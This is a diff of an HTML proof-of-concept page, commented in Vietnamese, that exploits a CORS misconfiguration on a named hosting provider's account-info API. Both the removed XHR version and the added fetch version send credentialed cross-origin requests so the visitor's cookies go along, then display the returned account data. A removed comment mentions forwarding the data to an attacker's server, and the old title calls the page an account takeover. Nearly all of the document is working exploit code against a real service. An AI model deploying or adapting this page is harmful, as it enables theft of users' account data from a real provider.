@@ -1,35 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS PoC - Timeweb Account Takeover</title>
+    <title>CORS PoC - Timeweb</title>
 </head>
 <body>
-    <h1>Đang khai thác lỗi CORS...</h1>
-    <pre id="result">Đang chờ dữ liệu...</pre>
+    <h1>Timeweb CORS Exploit PoC</h1>
+    <p>Trạng thái: <strong id="status">Đang gửi request...</strong></p>
+    <pre id="result" style="background: #f4f4f4; padding: 10px; border: 1px solid #ccc; min-height: 100px;"></pre>
 
     <script>
-        // URL endpoint bị lỗi
-        var targetUrl = "https://timeweb.cloud/api/v2/accounts/info";
-
-        // Tạo request cross-origin
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", targetUrl, true);
+        const targetUrl = "https://timeweb.cloud/api/v2/accounts/info";
         
-        // BẮT BUỘC phải có dòng này để gửi kèm cookie của nạn nhân
-        xhr.withCredentials = true; 
-
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                // In dữ liệu bị rò rỉ ra màn hình (hoặc gửi về server của attacker)
-                document.getElementById("result").innerText = xhr.responseText;
+        fetch(targetUrl, {
+            method: 'GET',
+            credentials: 'include', // Bắt buộc để gửi cookie
+            headers: {
+                'Accept': 'application/json'
             }
-        };
-
-        xhr.onerror = function() {
-            document.getElementById("result").innerText = "Lỗi kết nối hoặc bị chặn bởi CORS.";
-        };
-
-        xhr.send();
+        })
+        .then(response => {
+            document.getElementById("status").innerText = "HTTP Status: " + response.status;
+            if (response.ok) {
+                return response.json();
+            } else {
+                throw new Error("Bị chặn bởi trình duyệt hoặc lỗi xác thực. Status: " + response.status);
+            }
+        })
+        .then(data => {
+            document.getElementById("status").innerText = "KHAI THÁC THÀNH CÔNG!";
+            document.getElementById("status").style.color = "green";
+            document.getElementById("result").innerText = JSON.stringify(data, null, 2);
+        })
+        .catch(error => {
+            document.getElementById("status").innerText = "LỖI (Xem chi tiết bên dưới)";
+            document.getElementById("status").style.color = "red";
+            document.getElementById("result").innerText = error.message + "\n\nLưu ý: Nếu bạn thấy lỗi CORS hoặc 401, hãy mở tab Network (F12) để kiểm tra xem cookie có được gửi đi không.";
+            console.error("PoC Error:", error);
+        });
     </script>
 </body>
 </html>
